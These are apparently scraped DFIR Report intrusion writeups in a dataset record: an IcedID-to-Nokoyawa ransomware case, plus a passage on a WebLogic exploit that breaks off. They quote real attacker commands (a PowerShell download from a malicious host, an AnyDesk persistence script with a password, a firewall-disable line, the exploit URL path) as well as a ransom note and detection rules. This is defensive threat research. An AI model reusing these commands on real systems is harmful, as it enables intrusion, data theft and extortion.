de-obfuscating the batch file (or by observing the child processes created during dynamic analysis), the purpose of the script becomes clear. powershell invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile c:\\programdata\\COIm.jpg It uses PowerShell to download a payload file from a URL. The remote server request makes it look like it could be a GIF image that is being downloaded. The file is dropped to C:\\programdata\\ using a filename that looks like a JPEG image. The real filetype is actually a DLL: The file was then run using rundll32. rundll32 c:\\programdata\\COIm.jpg,init Somewhat surprisingly, more than a month after initial access in the intrusion, after the threat actor had started interacting with the compromised machine using AnyDesk, they opened the OneNote file and double-clicked the Open button to launch IcedID again. We are unsure of the motivation of this action, but this represented another chance for defenders to respond if detections were in place. Execution of Cobalt Strike Beacon On the 33rd day of the intrusion, the IcedID malware was observed dropping several files. These files were Cobalt Strike beacons, which were then executed via the IcedID malware. IcedID was running in rundll32.exe, which launched a DLL version of Cobalt Strike beacon from the user\u2019s AppData\\Local\\Temp directory using regsvr32.exe. The IcedID rundll32.exe process also launched an EXE version of a beacon named \u201cFuna2.exe\u201d from the same Temp directory. During lateral movement activity, the threat actors deployed the same executable Cobalt Strike beacon as seen on the beachhead host. This time, they used the name csrss.exe and executed these using the RDP session. The files were downloaded onto the lateral hosts using Internet Explorer, then executed by clicking directly from the Internet Explorer download prompt or by double-clicking in File Explorer window. Throughout the later stages of the intrusion the Cobalt Strike beacons used various named pipes. One of the many effective ways to detect Cobalt Strike beacon in this intrusion was through the named pipes it created, which used the default naming patterns. These pipe creation events were observed with Sysmon. A DLL version of the Cobalt Strike beacon was dropped on the beachhead host in the Local AppData Temp directory and executed with RegSvr32.exe, but that process did not create any named pipes. The default Cobalt Strike pipes are (the \u201c*\u201d symbolize the prefix/suffix): \\postex_* \\postex_ssh_* \\status_* \\msagent_* \\MSSE-* \\*-server More strategies for detecting Cobalt Strike can be found in Cobalt Strike, a Defender\u2019s Guide part 1 and part 2 . Persistence During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it: Cadiak.dll : IcedID first stage. license.dat : Encoded version of the second stage, which gets loaded into memory by the first stage. A scheduled task was created that contained instructions for executing the IcedID DLL and the location of the license.dat file. This is a very common method that IcedID uses for persistence. <?xml version=\"1.0\" encoding=\"UTF-16\"?> <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"> <RegistrationInfo> <URI>\\azigci_{C747FFDF-F0E2-113B-8DCA-0ECA4EBB92A2}</URI> </RegistrationInfo> <Triggers> <LogonTrigger id=\"LogonTrigger\"> <Enabled>true</Enabled> <UserId>[REDACTED]</UserId> </LogonTrigger> </Triggers> <Principals> <Principal id=\"Author\"> <RunLevel>HighestAvailable</RunLevel> <UserId>[REDACTED]</UserId> <LogonType>InteractiveToken</LogonType> </Principal> </Principals> <Settings> <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries> <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries> <AllowHardTerminate>false</AllowHardTerminate> <StartWhenAvailable>true</StartWhenAvailable> <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable> <IdleSettings> <Duration>PT10M</Duration> <WaitTimeout>PT1H</WaitTimeout> <StopOnIdleEnd>true</StopOnIdleEnd> <RestartOnIdle>false</RestartOnIdle> </IdleSettings> <AllowStartOnDemand>true</AllowStartOnDemand> <Enabled>true</Enabled> <Hidden>false</Hidden> <RunOnlyIfIdle>false</RunOnlyIfIdle> <WakeToRun>false</WakeToRun> <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> <Priority>7</Priority> </Settings> <Actions Context=\"Author\"> <Exec> <Command>rundll32.exe</Command> <Arguments>\"C:\\Users\\[REDACTED]\\AppData\\Roaming\\[REDACTED]\\Cadiak.dll\",init --od=\"DeskBlouse\\license.dat\"</Arguments> </Exec> </Actions> </Task> The scheduled task was configured to execute at logon under the user that initially executed the IcedID payload. Later in the intrusion, AnyDesk was installed with a command line option that established persistence, running when Windows starts by creating a Service: C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent During the deployment of AnyDesk, a service creation event was generated under the System channel: Alerting on every service creation is usually far too noisy for any meaningful review by security operations personnel, but it can be very helpful to alert on specific patterns of remote monitoring and management (RMM) installation artifacts. There are many approaches for detecting RMM tools through resilient patterns of file paths or digital signatures. These legitimate tools may not trigger alerts in endpoint detection products by default, so it is important for security teams to create custom detections. As seen in various previous cases here at The DFIR Report, and also on other platforms, RMM tools provide a very easy way to get access to systems with interactive capabilities. Privilege Escalation The user account that opened the initial OneNote lure file was in the domain administrators security group. Usually, threat actors have to work to escalate to a domain admin from an unprivileged user account, but in this case, it was a given. This is an example of why it is a best practice for domain administrators to use separate accounts and a privileged workstation to perform administrative functions, while using a non-privileged user account to check email, browse the web, and open files from unknown sources when necessary. Defense Evasion Masquerading One of the simpler ways that IcedID attempted to evade detection was by naming the malware DLL file as COIm.jpg. Renaming a DLL file extension to a commonly ignored graphics file type, such as jpg, gif, or png, is a simple example of Masquerading, MITRE Technique T1036.008 , and represents an excellent opportunity for a custom detection . The threat actor was observed using common Windows process names for other tooling used during the intrusion, including: csrss.exe for a Cobalt Strike beacon downloaded from 91.215.85[.]183/download/csrss.exe svchost.exe for the ransomware payload deployed to systems. Process Injection Upon execution of a Cobalt Strike beacon, process injection into a svchost.exe process was observed. In this case, process injection was conducted by writing into a remote process and executing the code via a remote thread. svchost.exe was subsequently observed executing multiple different commands related to discovery and enumeration. Since the discovery commands involved executing scripts via cmd.exe , the anomalous parent child relationship between svchost.exe and cmd.exe was observed on the system from a memory dump. Indicator Removal FileZilla, installed by the threat actors for exfiltration activity, was observed being manually uninstalled by the threat actors during the final ransomware deployment period. Credential Access The threat actors extracted credentials from LSASS during the intrusion. The process started with a Cobalt Strike beacon process starting a new rundll32.exe child process, with no command line arguments, as SYSTEM. It is unusual for rundll32 to be executed without any command line, but it is a common pattern for Cobalt Strike beacon injection target processes. This makes a useful detection pattern. The rundll32 process also created a named pipe (Sysmon Event ID 17) with a pipe name that started with \u201c\\postex_\u201d which is another well-known Cobalt Strike beacon artifact that can be detected. The newly spawned rundll32 process accessed the lsass.exe process, and then created a remote thread in lsass.exe. These events were recorded by Sysmon event IDs 8 and 10. Event ID 10 had the following relevant fields, which may be useful for threat hunting or incident response: Process accessed: SourceImage: C:\\Windows\\system32\\rundll32.exe TargetImage: C:\\Windows\\system32\\lsass.exe GrantedAccess: 0x1FFFFF CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d1e4|C:\\Windows\\System32\\KERNELBASE.dll+2bcbe|UNKNOWN(0000017C0BD11D3D) TargetUser: NT AUTHORITY\\SYSTEM Event ID 8 had the following relevant fields: CreateRemoteThread detected: SourceImage: C:\\Windows\\System32\\rundll32.exe TargetImage: C:\\Windows\\System32\\lsass.exe StartModule: - StartFunction: - TargetUser: NT AUTHORITY\\SYSTEM After accessing and injecting into LSASS, the threat actors began using another domain administrator account indicating successful credential access. During file share browsing activity by the threat actors, we observed them finding and opening a document related to passwords for the environment. Discovery IcedID Discovery IcedID was observed executing multiple discovery commands originating from rundll32.exe on the beachhead. WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List ipconfig /all systeminfo net config workstation nltest /domain_trusts nltest /domain_trusts /all_trusts net view /all /domain net view /all net group \"Domain Admins\" /domain These host profiling commands in this order are typically seen from IcedID bots, and reverse engineering the IcedID binary shows that they are hard-coded (in encrypted strings) to be run when the bot receives a specific command from its command and control server. A published IcedID analysis report from Binary Defense describes the same commands observed , and a report from Walmart Global Tech details the algorithm to decrypt the command strings. In different IcedID samples, the commands may appear in a different order, but all versions contain nearly the same list of profiling commands. While alerting on any one of these commands by itself might result in too many false-positive alerts for security operations, a useful technique is to set up alerts when more than three or four of these commands are seen in a short time period on the same host. If the parent process is rundll32, regsvr32, or another high-risk process, the severity of the alert may be elevated. Active Directory Enumeration An AD.bat batch script and AdFind.exe were dropped onto the beachhead host from a process injected svchost.exe process. The AD.bat script was subsequently executed, which initiated discovery of Active Directory via ADFind. adfind.exe -gcb -sc trustdmp adfind.exe -f \"(objectcategory=group)\" adfind.exe -subnets -f (objectCategory=subnet) adfind.exe -f (objectcategory=organizationalUnit) adfind.exe -f objectcategory=computer -csv name operatingSystem adfind.exe -f objectcategory=computer adfind.exe -f (objectcategory=person) C:\\Windows\\system32\\cmd.exe /c dir /s /b C:\\Windows\\system32\\*htable.xsl Nslookup Discovery An injected process svchost.exe was observed dropping a ns.bat Batch script. Execution of ns.bat initiated the execution of nslookup commands that attempted to resolve multiple desktop and server hostnames. Later, a second nsser.bat script was observed executing multiple nslookup commands. Port Scanning SoftPerfect Network Scanner was used by the threat actor on multiple different systems under different directories. NetScan was seen connecting to multiple ports, on multiple different IP addresses\u2013an activity indicative of port scanning. The following summarizes a list of ports that were scanned using NetScan. Port Purpose 53 DNS 80 HTTP 88 Kerberos 111 NFS, NIS, or any rpc-based service 135 Remote Procedure Call 137 NetBIOS 161 SNMP 389 LDAP 443 HTTPS 445 SMB 464 Used by the Kerberos authentication system 2049 NFS 3389 RDP 5353 Multicast DNS (mDNS) and DNS-SD Hands on Discovery During RDP sessions the threat actors were also observed opening Task Manager multiple times via the Start Menu, as indicated by the /7 flag. Other commands were observed being executed manually by the threat actors, either from Cobalt Strike beacons or in Windows cmd shells opened via the interactive AnyDesk or RDP sessions. Commands included: C:\\Windows\\system32\\cmd.exe /C net group \"domain Admins\" /domain route print whoami Lateral Movement RDP was used by the threat actors to move laterally from the beachhead to other servers in the environment. After connecting to each server with RDP, the threat actors took steps to deploy a Cobalt Strike beacon, as well as AnyDesk on the system. The Cobalt Strike payload was downloaded from 91.215.85[.]183/download/csrss.exe via Internet Explorer. The payload was then launched multiple times from the Downloads folder and also copied and executed from the Windows temporary folder. In addition, the INSTALL.ps1 script was dropped and executed by the Cobalt Strike beacon. Collection While the threat actors had spent significant time in the environment, there appeared to be some interest in certain documents. A concrete example is, directly after the threat actors accesses the file server with AnyDesk, they use notepad++ to open a file related to the insurance policy of this victim. On the beachhead, workstation files were opened with their \u2018preferred\u2019 option: Word for .docx, Excel for .xlsx and Internet Explorer for .pdf. While it is not always easy to get a full list of files a threat actor had specifically accessed, this time it was logged well in process activity. On other machines, there was apparent interest in certain files, mainly related to possible passwords, PII and other financial data. Command and Control The threat actors used three different ways to access the hosts within this network: IcedID Cobalt Strike AnyDesk Below is an overview of each of the stages found during the intrusion. IcedID IcedID uses multiple staged domains to deliver parts of its functionality. The IcedID DLL running in the rundll32 process immediately connected to its command and control server on port 80, using domain name aerilaponawki[.]com, which resolved at the time to 193.149.129.131. The contents of this network connection matched a malware rule in the free Emerging Threats Open ruleset ET MALWARE Win32/IcedID Request Cookie. The IcedID process also connected to two other command and control servers by domain name, but both of these connections used TLS over port 443, so it was not possible for the network sensor to observe as much content or match as many network detection rules as it would have with TLS termination or unencrypted traffic. The connection to klindriverfor[.]com (5.255.102.167) on port 443 repeated about once every 10 minutes for 12 days. The connection to alishaskainz[.]com (45.61.139.206) on port 443 also repeated about once every 10 minutes for 28 days. Below table shows an overview and function of each domain: IP Port Domain Usage ISP Location 193.149.129.131 80 aerilaponawki[.]com First callout and primary C2 IcedID BLNWX NL 5.255.102.167 443 klindriverfor[.]com Additional C2 IcedID The Infrastructure Group NL 45.61.139.206 443 alishaskainz[.]com Additional C2 IcedID BL Networks GB GB 5.255.105.55 443 halicopnow[.]com Additonal C2 IcedID The Infrastructure Group NL For each of the domains, an overview of the relevant rules that can be used (in combination) to look for IcedID behavior: aerilaponawki[.]com: ET MALWARE Win32/IcedID Request Cookie klindriverfor[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) alishaskainz[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) halicopnow[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) When looking for additional strange network connections, we can find these two gathered from a memory dump of the compromised systems. The connection from rundll32.exe is especially interesting and is related to our IcedID infection. It appears to be a different IP for one of the previously found command and control domains. IP Port Domain Usage ISP Location 162.33.178.40 443 alishaskainz[.]com Additional C2 IcedID BL Networks GB GB Cobalt Strike The Cobalt Strike beacons which were used during the intrusion were named: agaloz.dll Funa2.exe / csrss.exe They contain a configuration to contact the below command and control server: IP Domain Usage ISP Location 91.215.85.183 msc-mvc-updates[.]com Cobalt Strike C2 Prospero Ooo RU Suricata reported hits for \u2018 Malleable\u2019 profiles used by the Cobalt Strike beacon. These profiles are preconfigurable and are mostly used to \u2018mimic\u2019 known traffic of different applications, such as a mail client, chat client, or a JavaScript library. The rule that hits, can be seen in the first screenshot below. The second screenshot shows the actual configured portion of the profile, which appears very similar to this \u201cgmail\u201d profile . Communication goes via the URI: /_/scs/mail-static/_js/ The DFIR Report Threat Intel Team picked up this Cobalt Strike server on January 9th, 2023, weeks before the intrusion. On that day, the beacon profile resembled a freely available malleable C2 profile that mimics jquery . The command and control server appears to have been in use through at least April 2024 with a different Cobalt Strike beacon reported to the Triage malware sandboxing service using the same gmail-like profile and remote IP as observed in this intrusion. With that said, it appears Microsoft took over this domain on April 6, 2023 when DNS was switched from Cloudflare to MICROSOFTINTERNETSAFETY.NET and the domain started resolving to 20.69.178.82 (Microsoft). We can see the registration information was updated (date showing last updated) as well: We were also able to locate the complaint by Microsoft, Fortra and Health-ISAC to acquire this domain: Here\u2019s an outtake of the domain and registration information from the complaint . According to The DFIR Report\u2019s Threat Intel Team, the IP was observed hosting Cobalt Strike through June 3, 2023. After initial deployment, the threat actors downloaded additional beacons, all of which have a parent process of the executable called Funa2.exe . It appears that the .dll likely didn\u2019t work as expected, as five minutes later an .exe with the same name gets downloaded. DLL download attempt: Change to EXE download: Shortly after, we find the first connection to the server using the malleable profile paths: AnyDesk During later stages of the intrusion, the threat actors deployed AnyDesk using a PowerShell script copied under C:\\ProgramData\\INSTALL.ps1 . In addition, the copied PowerShell script was executed on multiple systems to facilitate the deployment of AnyDesk using the following commands: mkdir \"C:\\ProgramData\\Any\" # Download AnyDesk $clnt = new-object System.Net.WebClient $url = \"http://download.anydesk.com/AnyDesk.exe\" $file = \"C:\\ProgramData\\AnyDesk.exe\" $clnt.DownloadFile($url,$file) cmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent cmd.exe /c echo btc1000qwe123 | C:\\ProgramData\\Any\\AnyDesk.exe --set-password #net user AD \"2020\" /add #net localgroup Administrators InnLine /ADD #reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v InnLine /t REG_DWORD /d 0 /f This install script appears to be similar to the previously leaked powershell script used by Conti : AnyDesk can be used, either as an installed service (as we can see above) or it can use a portable version. The differences and limitations are written on the official site of AnyDesk . As we are dealing with the \u2018installed\u2019 version, it will leave certain artifacts related to the installed version on the system. Multiple people have written about AnyDesk artifacts, such as Inversecos or TylerBrozek , which help a lot during the forensic process related to Anydesk artifacts. For the ad_svc.trace we can find entries like this: info REDACTED gsvc 6600 11452 26 anynet.any_socket - Client-ID: 485343132 (FPR: 9805919074ee). info REDACTED gsvc 6600 11452 46 anynet.any_socket - Logged in from 152.89.196.49:61384 on relay a541c14e info REDACTED gsvc 10136 2256 2515 anynet.any_socket - Client-ID: 547283332 (FPR: 17e2ee445059). info REDACTED gsvc 10136 2256 2515 anynet.any_socket - :54241 on relay ffe9a90c. IP Usage ISP Country AnyDesk Client ID 152.89.196.49 AnyDesk Interactive Starcrecium Limited RU 485343132 185.29.9.162 AnyDesk Interactive DataClub SE 547283332 Exfiltration After the threat actors gained access to a file server in the domain, they quickly prepared this machine for exfiltration. This was performed by downloading the Filezilla FTP client installer using internet explorer on the server. The threat actors were so kind to use the sponsored version, to bring some additional PUP\u2019s as well: Shortly after, the threat actors connected from the file server, using FileZilla, to 45.155.204.5 via SSH and key exchange can be observed in the network traffic: IP Usage ISP Country SSH Info: 45.155.204.5 SSH for FileZilla 3NT Solutions LLP RU Hash : c561c2cdad206b6ed8469079e037e3f9 SSH Version : ssh-2.0-filezilla_3.63.2.1 FileZilla can leave behind some nice forensics artifacts (if the installation is not removed). Writing in this blog by Artifast , a nice overview can be seen. In this case, we were able to recover part of the .xml files resulting in the below correlation between the network data and the host data. While each separate source was already a good finding on its own, this combination leaves less room for guessing. Impact Thirty-four days after the first infection, and about 28 hours after the beginning of hands-on activity, the threat actors proceeded to their final actions, deploying Nokayawa ransomware. The variant of Nokoyawa was similar to those we\u2019ve already reported on . As in most ransomware related cases, before actual deployment, the threat actors looked around to gather information related to backup functionality and systems. In this case, the threat actors moved around between a file server and a backup server, making and viewing configurations, dropping and \u2018debugging\u2019 the ransomware and finally cleaning up. The threat actors started by using mmc.exe to look into the Local Group Policy by using gpedit.msc. Around 20 minutes later, the threat actors started executing the ransomware script on the file server. The ransomware files, in this case svchost.exe and an \u2018automation\u2019 file [REDACTED].1.bat , were delivered via the AnyDesk sessions as parent process. The batch script, [REDACTED].1.bat , launched the executable svchost.exe with a --config parameter, containing a base64 encoded string: { EXTENSION: \"NOKONOKO\", NOTE_NAME: \"NOKONOKO-readme.txt\", NOTE_CONTENT: \"<BASE64 ENCODED NOTEBLOB>\", ECC_PUBLIC: \"AHpyfaG1ftdE4NNQ0laC2825GOpTwUw5Y9+WEMkAAAC0Yd7VSOy7D5CxWhHH4pzSYdCXjpPXqEZ2X2r6kgEAAA==\", SKIP_DIRS: [ \"windows\", \"program files\", \"program files (x86)\", \"appdata\", \"programdata\", \"system volume information\" ], SKIP_EXTS: [ \".exe\", \".dll\", \".ini\", \".lnk\", \".url\" ], ENCRYPT_NETWORK: true, LOAD_HIDDEN_DRIVES: true, DELETE_SHADOW: true } After the execution on the file server, the threat actors moved to the backup server, where they repeated their interest in the Group Policy. On the backup server, they also opened the server configuration. There appeared to be a problem, as there was some \u2018file locking\u2019 in place, likely preventing access. The threat actors tried to circumvent these \u2018locks\u2019 by utilizing a tool called IOBit . This tool is capable of removing file locks. After this, the ransomware was deployed in the same manner as on the file server. However, there appeared to be a problem with the deployment. The threat actors started ProcessHacker and utilized notepad++ to likely fix something related to the ransomware execution. This is based on the fact that, the threat actors executed the ransomware binary 11 times on the backup server and afterwards returned and executed the ransomware a second time on the file server. After encrypting the back up server, the threat actors uninstalled the backup software using add/remove programs. In addition, notepad was used to view the deployed ransom note after the final execution on the file server. The NOTE_CONTENT (from above base64 configuration) appears to be base64 encoded again and decoded gives the following ransom note: Nokoyawa. If you see this, your files have been successfully encrypted and stolen. Don't try to search free decryption method. It's impossible. We are using symmetrical and asymmetric encryption. ATTENTION: - Don't rename encrypted files. - Don't change encrypted files. - Don't use third party software. You are risking irreversibly damaging the file by doing this. If you manage to keep things quiet on your end, this will never be known to the public. To reach an agreement you have 48 hours to visit our Onion Website. How to open Onion links: - Download TOR Browser from official website. - Open and enter this link: http://nokopay<REDACTED> - On the page you will see a chat with the Support. - Send your first message. Don't waste your time. Otherwise all your valuable and sensitive data will be leaked. Our websites are full of companies that doubted the fact of the data breach or it's extent. - http://nokoleakb76znymx443veg4n6fytx6spck6pc7nkr4dvfuygpub6jsid.onion/ - http://hl66646wtlp2naoqnhattngigjp5palgqmbwixepcjyq5i534acgqyad.onion/ - http://snatchteam.top The threat actors only deployed the ransomware on the two servers and did not perform a domain wide deployment. After the ransom of these two systems, the threat actor\u2019s activity ceased. Please consider leaving feedback on this report here . Timeline Diamond Model Indicators Atomic IcedID mrassociattes[.]com (174.138.188.6) aerilaponawki[.]com (193.149.129.131) klindriverfor[.]com (5.255.102.167) alishaskainz[.]com (dr) Cobalt Strike msc-mvc-updates[.]com (91.215.85.183) FileZilla File Exfiltration 45.155.204.5 Computed Contract_02_21_Copy#909.one 5f4d630ef00656726401b205ae4dc88f aa8f2d6d98aa535e05685076ca02f781c2aa6464 9c337d27dab65fc3f4b88666338e13416f218ab75c4b5e37cc396241c225efe8 COIm.jpg d1da347e78bf043e2dc61638e946c3da d87a3c22771b1106a1a52d96df7b2944d93fa184 1ab812f7d829444dc703eeb02ea0a955ec839d5e2a9b619d44ac09a91135cad1 GET_ID.bat a59a7916156c52f732b4c2e321facfe1 8c949a7769d16c285347f650ef2eedac01dc1805 eae2bce6341ff7059b9382bfa0e0daa337ea9948dd729c0c1e1ee9c11c1c0068 INSTALL.ps1 b1f5e4774aa79f643350218df61e33f6 f1e7994c6568f0182a60f64557c7793df5e550ed b378c2aa759625de2ad1be2c4045381d7474b82df7eb47842dc194bb9a134f76 agaloz.dll 76a1f94ed6499b99d2cc500998846875 ca14d61bcf038cda45199f54c7c452ad262a7c88 d6127d614309acbf2a630fe3fb0fda8e4079dcf2045f91aa400d179751d425f7 csrss.exe/Funa2.exe f927cd4f40c7a6dad769a8f9af771a8c 0fdfef7c9cc4305df81b006e898e1592aa822437 06bbb36baf63bc5cb14d7f097745955a4854a62fa3acef4d80c61b4fa002c542 svchost.exe 8800e6f1501f69a0a04ce709e9fa251c 72a1c9ea93d18309769d8be5cdb3daedf1cddcf5 3c9f4145e310f616bd5e36ca177a3f370edc13cf2d54bb87fe99972ecf3f09b4 Detections Network ET MALWARE Observed DNS Query to IcedID Domain (qoipaboni .com) ET MALWARE Win32/IcedID Request Cookie ET INFO Windows Powershell User-Agent Usage ETPRO INFO HTTP Request with Lowercase accept Header Observed ET MALWARE Cobalt Strike Malleable C2 (Unknown Profile) ET SCAN Behavioral Unusual Port 1433 traffic Potential Scan or Infection ET POLICY SMB2 NT Create AndX Request For an Executable File ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET POLICY HTTP traffic on port 443 (POST) ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement ET SCAN Potential SSH Scan OUTBOUND ET HUNTING Possible Powershell .ps1 Script Use Over SMB ET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File ET HUNTING Suspicious csrss.exe in URI ET INFO Executable Download from dotted-quad Host ET INFO Dotted Quad Host DLL Request Sigma Search rules on detection.fyi or sigmasearchengine.com DFIR Public Rules Repo : b26feb0b-8891-4e66-b2e7-ec91dc045d58 : AnyDesk Network 50046619-1037-49d7-91aa-54fc92923604 : AdFind Discovery 8a0d153f-b4e4-4ea7-9335-892dfbe17221 : NetScan Share Enumeration Write Access Check DFIR Private Rules: baa9adf9-a01c-4c43-ac57-347b630bf69e : Default Cobalt Strike Named Pipes a526e0c3-d53b-4d61-82a1-76d3d1358a30 : Silent Installation of AnyDesk RMM b526e0c3-d53b-4d61-82a1-76d3d1358a31 : AnyDesk RMM Password Setup via Command Line 624f1f33-ee38-4bbe-9f4a-088014e0c26b : IcedID Malware Execution Patterns 37948baa-5310-424c-bb18-b29c56be160f : Suspicious Execution of DLL with Unusual File Extensions Sigma Repo : 530a6faa-ff3d-4022-b315-50828e77eef5 : Anydesk Remote Access Software Service Installation 114e7f1c-f137-48c8-8f54-3088c24ce4b9 : Remote Access Tool - AnyDesk Silent Installation b52e84a3-029e-4529-b09b-71d19dd27e94 : Remote Access Tool - AnyDesk Execution b1377339-fda6-477a-b455-ac0923f9ec2c : Remote Access Tool - AnyDesk Piped Password Via CLI 065b00ca-5d5c-4557-ac95-64a6d0b64d86 : Remote Access Tool - Anydesk Execution From Suspicious Folder 9a132afa-654e-11eb-ae93-0242ac130002 : PUA - AdFind Suspicious Execution 903076ff-f442-475a-b667-4f246bcc203b : Nltest.EXE Execution 5cc90652-4cbd-4241-aa3b-4b462fa5a248 : Potential Recon Activity Via Nltest.EXE 0ef56343-059e-4cb6-adc1-4c3c967c5e46 : Suspicious Execution of Systeminfo 968eef52-9cff-4454-8992-1e74b9cbad6c : Reconnaissance Activity e568650b-5dcd-4658-8f34-ded0b1e13992 : Potential Product Class Reconnaissance Via Wmic.EXE fcc6d700-68d9-4241-9a1a-06874d621b06 : Suspicious File Created Via OneNote Application d5601f8c-b26f-4ab0-9035-69e11a8d4ad2 : CobaltStrike Named Pipe 811e0002-b13b-4a15-9d00-a613fce66e42 : PUA - Process Hacker Execution d5866ddf-ce8f-4aea-b28e-d96485a20d3d : Files With System Process Name In Unsuspected Locations 96036718-71cc-4027-a538-d1587e0006a7 : Windows Processes Suspicious Parent Directory c8557060-9221-4448-8794-96320e6f3e74 : Windows PowerShell User Agent JoeSecurity Repo : 200068 : Execute DLL with spoofed extension Yara https://github.com/The-DFIR-Report/Yara-Rules/blob/main/19772/19772.yar MITRE Credentials In Files - T1552.001 Data Encrypted for Impact - T1486 Data from Network Shared Drive - T1039 Domain Groups - T1069.002 Domain Trust Discovery - T1482 Exfiltration Over Alternative Protocol - T1048 File and Directory Discovery - T1083 Indicator Removal - T1070 Ingress Tool Transfer - T1105 LSASS Memory - T1003.001 Malicious File - T1204.002 Masquerade File Type - T1036.008 Masquerading - T1036 Network Service Discovery - T1046 Phishing - T1566 PowerShell - T1059.001 Process Discovery - T1057 Process Injection - T1055 Regsvr32 - T1218.010 Remote Access Software - T1219 Remote Desktop Protocol - T1021.001 Remote System Discovery - T1018 Rundll32 - T1218.011 Scheduled Task - T1053.005 Security Software Discovery - T1518.001 System Information Discovery - T1082 System Owner/User Discovery - T1033 Web Protocols - T1071.001 Windows Command Shell - T1059.003 Windows Service - T1543.003 Internal case #19772 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Threat Brief: WordPress Plugin Exploit Leads to Godzilla Web Shell, Discovery & New CVE From IcedID to Dagon Locker Ransomware in 29 Days Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "expected_count": 2
  },
  {
    "url": "http://127.0.0.1:8001/articles/989",
    "title": "WebLogic RCE Leads to XMRig \u2013 The DFIR Report",
    "content": "WebLogic RCE Leads to XMRig \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts cryptominer CVE-2020-14882 WebLogic RCE Leads to XMRig June 3, 2021 Intro This report will review an intrusion where, the threat actor took advantage of a WebLogic remote code execution vulnerability (CVE-2020\u201314882) to gain initial access to the system before installing a coin miner (XMRig). Summary In the attack, the threat actor took around 2 minutes from initial access, to running a persistent coin miner. The speed and number of times the exploit was ran against the target make it likely that this was an automated attack, rather than human operated intrusion. The threat actor exploited CVE-2020-14882 by making a request to the WebLogic server, which allowed the attacker to execute code. The payload then ran a PowerShell command to download a PowerShell script from a remote server. This script downloaded a loader and executed it, then it enabled persistence mechanisms. Next, the loader downloaded XMRig, and started the mining process. While this attack took place around a month ago the payloads used in the intrusion continue to be hosted as of this publication, indicating that this threat is still active and finding vulnerable WebLogic hosts to continue exploiting. Analysis and reporting completed by @tas_kmanager and @TheDFIRReport Reviewed by @iiamaleks and @samaritan_o MITRE ATT&CK Initial Access Before jumping into the details of the attack, it is pertinent to understand CVE-2020-14882. This vulnerability was discovered back in October 2020, which effects Oracle\u2019s WebLogic product. [ 1 ] We previously reported on an intrusion that also used this exploit and ended in a coin miner. This vulnerability is easy to exploit, and leads to remote code execution (RCE) without authentication. Just by invoking URL path /console/images/%252E%252E%252Fconsole.portal and a little bit of tweaking of the packet sent to the server, the threat actor will be able to run their code on the server. In this case, we can clearly see from network logs that the attacker was probing the portal page and followed that by sending the crafted URL request. The detailed payload in the header can be observed below: Interestingly, we can see the threat actor chose the FileSystemXmlApplicationContext class to carry out this attack, executing a file named poc.xml . This technique is listed in PoC developed by Jang. [ 2 ] Below we can see the payload inside of the xml file hosted in the attacker server. The payload will execute the PowerShell command on the vulnerable system. Execution The threat actor leveraged the WebLogic vulnerability to spawn a command shell from the server running in the Java process, which then in turn, was used to run PowerShell and collect the final payload that the threat actor wished to run on the system. Next, let us investigate the content of the PowerShell script (ldr.ps1) On line one, we can see var $cc (can be pronounced as C2?) that indicates the server where it will get all the other components such as the payload sys.exe. The next line sets up random characters to be appended to the payload executable. This binary (renamed to sysvr013.exe ) was then executed by the same script. Persistence There are several persistence mechanisms observed. The first one utilizes schtasks to create a task called \u201c BrowserUpdate \u201d. schtasks /create /F /sc minute /mo 1 /tn \"BrowserUpdate\" /tr \"$dst\" It also created a registry run key to execute the miner binary on reboot. We also observed the Loader binary adding npf.sys (WinPcap binary) as a scheduled task. Privilege Escalation No privilege escalation was observed, but note that the Java.exe process was running as a high integrity process from the start. Defense Evasion From the PowerShell script above (ldr.ps1), we can see that name is being randomized to avoid detection by blue team. We can also see that the attacker disabled firewall rules to make sure connection to the mining pool was not blocked. netsh advfirewall set allprofiles state off As noted above, the attacker created a task called \u201c BrowserUpdate \u201d to masquerade the scheduled task as a web browser update task. Discovery We can see several local discovery commands executed from the PowerShell script. They are looking for existing mining process on the machine, such as kthreaddi , sysrv , etc. They also utilize netstat to find if any process is using mining related ports, such as 3333, 4444, etc. This is likely partially to kill other rival miners but also to prevent 